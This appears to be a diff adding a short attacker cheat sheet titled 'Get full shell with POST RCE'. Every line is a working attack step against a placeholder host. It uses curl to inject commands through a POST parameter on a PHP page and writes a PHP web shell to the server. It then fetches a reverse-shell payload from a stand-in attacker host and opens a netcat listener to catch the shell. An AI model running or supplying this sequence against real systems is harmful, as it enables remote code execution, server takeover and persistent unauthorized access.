@@ -1,0 +1,12 @@
+Get full shell with POST RCE
+attacker:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=%3Bwhoami&submit=submit' 'http://victum.tk/command.php'
+
+attacker:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&submit=submit' 'http://victum.tk/command.php'
+
+attacker:~$ curl http://victum.tk/shell.php?cmd=id
+
+# download reverse shell to server (phpshell.php)
+http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27
+
+# run nc and execute phpshell.php
+attacker:~$ nc -nvlp 1337
